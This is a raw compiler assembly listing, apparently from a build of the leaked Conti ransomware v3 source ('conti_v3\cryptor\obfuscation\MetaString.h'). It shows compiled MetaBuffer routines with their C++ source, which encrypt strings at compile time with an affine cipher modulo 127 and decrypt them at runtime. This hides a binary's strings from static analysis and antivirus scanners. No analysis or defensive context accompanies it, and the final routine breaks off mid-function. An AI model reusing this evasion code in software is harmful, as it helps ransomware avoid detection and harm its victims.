  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 2a	 mov	 BYTE PTR [rcx+1], 42	; 0000002aH
  00007	c6 41 02 3d	 mov	 BYTE PTR [rcx+2], 61	; 0000003dH
  0000b	c6 41 03 28	 mov	 BYTE PTR [rcx+3], 40	; 00000028H
  0000f	c6 41 04 3d	 mov	 BYTE PTR [rcx+4], 61	; 0000003dH
  00013	c6 41 05 7a	 mov	 BYTE PTR [rcx+5], 122	; 0000007aH
  00017	c6 41 06 3d	 mov	 BYTE PTR [rcx+6], 61	; 0000003dH
  0001b	c6 41 07 45	 mov	 BYTE PTR [rcx+7], 69	; 00000045H
  0001f	c6 41 08 3d	 mov	 BYTE PTR [rcx+8], 61	; 0000003dH
  00023	c6 41 09 3d	 mov	 BYTE PTR [rcx+9], 61	; 0000003dH
  00027	c6 41 0a 3d	 mov	 BYTE PTR [rcx+10], 61	; 0000003dH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0CJ@$0DN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<41,61,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,61,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GF@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<101,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 6c 00 00 00	 mov	 eax, 108		; 0000006cH
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2c	 imul	 ecx, eax, 44		; 0000002cH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<101,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GF@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GF@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<101,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<101,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 37	 mov	 BYTE PTR [rcx+1], 55	; 00000037H
  00007	c6 41 02 6c	 mov	 BYTE PTR [rcx+2], 108	; 0000006cH
  0000b	c6 41 03 10	 mov	 BYTE PTR [rcx+3], 16
  0000f	c6 41 04 6c	 mov	 BYTE PTR [rcx+4], 108	; 0000006cH
  00013	c6 41 05 30	 mov	 BYTE PTR [rcx+5], 48	; 00000030H
  00017	c6 41 06 6c	 mov	 BYTE PTR [rcx+6], 108	; 0000006cH
  0001b	c6 41 07 64	 mov	 BYTE PTR [rcx+7], 100	; 00000064H
  0001f	c6 41 08 6c	 mov	 BYTE PTR [rcx+8], 108	; 0000006cH
  00023	c6 41 09 6c	 mov	 BYTE PTR [rcx+9], 108	; 0000006cH
  00027	c6 41 0a 6c	 mov	 BYTE PTR [rcx+10], 108	; 0000006cH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GF@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<101,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<101,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<17,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 39	 sub	 ecx, 57			; 00000039H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 0f	 imul	 r8d, ecx, 15

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<17,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<17,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 4d	 mov	 BYTE PTR [rcx+1], 77	; 0000004dH
  00007	c6 41 02 39	 mov	 BYTE PTR [rcx+2], 57	; 00000039H
  0000b	c6 41 03 16	 mov	 BYTE PTR [rcx+3], 22
  0000f	c6 41 04 39	 mov	 BYTE PTR [rcx+4], 57	; 00000039H
  00013	c6 41 05 52	 mov	 BYTE PTR [rcx+5], 82	; 00000052H
  00017	c6 41 06 39	 mov	 BYTE PTR [rcx+6], 57	; 00000039H
  0001b	c6 41 07 0d	 mov	 BYTE PTR [rcx+7], 13
  0001f	c6 41 08 39	 mov	 BYTE PTR [rcx+8], 57	; 00000039H
  00023	c6 41 09 39	 mov	 BYTE PTR [rcx+9], 57	; 00000039H
  00027	c6 41 0a 39	 mov	 BYTE PTR [rcx+10], 57	; 00000039H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<17,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BN@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<29,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0c 00 00
	00		 mov	 r10d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 76 00 00 00	 mov	 eax, 118		; 00000076H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 23	 imul	 ecx, eax, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<29,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BN@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BN@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<29,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<29,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 37	 mov	 BYTE PTR [rcx+1], 55	; 00000037H
  00007	c6 41 02 76	 mov	 BYTE PTR [rcx+2], 118	; 00000076H
  0000b	c6 41 03 06	 mov	 BYTE PTR [rcx+3], 6
  0000f	c6 41 04 76	 mov	 BYTE PTR [rcx+4], 118	; 00000076H
  00013	c6 41 05 0d	 mov	 BYTE PTR [rcx+5], 13
  00017	c6 41 06 76	 mov	 BYTE PTR [rcx+6], 118	; 00000076H
  0001b	c6 41 07 61	 mov	 BYTE PTR [rcx+7], 97	; 00000061H
  0001f	c6 41 08 76	 mov	 BYTE PTR [rcx+8], 118	; 00000076H
  00023	c6 41 09 27	 mov	 BYTE PTR [rcx+9], 39	; 00000027H
  00027	c6 41 0a 76	 mov	 BYTE PTR [rcx+10], 118	; 00000076H
  0002b	c6 41 0b 76	 mov	 BYTE PTR [rcx+11], 118	; 00000076H
  0002f	c6 41 0c 76	 mov	 BYTE PTR [rcx+12], 118	; 00000076H
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0BN@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<29,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<29,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BP@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BP@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<31,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 7b	 sub	 ecx, 123		; 0000007bH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 29	 imul	 r8d, ecx, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BP@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<31,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BP@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BP@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<31,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<31,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 19	 mov	 BYTE PTR [rcx+1], 25
  00007	c6 41 02 7b	 mov	 BYTE PTR [rcx+2], 123	; 0000007bH
  0000b	c6 41 03 68	 mov	 BYTE PTR [rcx+3], 104	; 00000068H
  0000f	c6 41 04 7b	 mov	 BYTE PTR [rcx+4], 123	; 0000007bH
  00013	c6 41 05 62	 mov	 BYTE PTR [rcx+5], 98	; 00000062H
  00017	c6 41 06 7b	 mov	 BYTE PTR [rcx+6], 123	; 0000007bH
  0001b	c6 41 07 16	 mov	 BYTE PTR [rcx+7], 22
  0001f	c6 41 08 7b	 mov	 BYTE PTR [rcx+8], 123	; 0000007bH
  00023	c6 41 09 7b	 mov	 BYTE PTR [rcx+9], 123	; 0000007bH
  00027	c6 41 0a 7b	 mov	 BYTE PTR [rcx+10], 123	; 0000007bH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BP@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<31,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<31,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$06$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<7,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 66		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 08 00 00
	00		 mov	 r10d, 8
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 1e 00 00 00	 mov	 eax, 30
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	03 c9		 add	 ecx, ecx

; 40   :     return (a % n + n) % n;

  00039	f7 e9		 imul	 ecx
  0003b	03 d1		 add	 edx, ecx
  0003d	c1 fa 06	 sar	 edx, 6
  00040	8b c2		 mov	 eax, edx
  00042	c1 e8 1f	 shr	 eax, 31
  00045	03 d0		 add	 edx, eax
  00047	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004a	2b c8		 sub	 ecx, eax
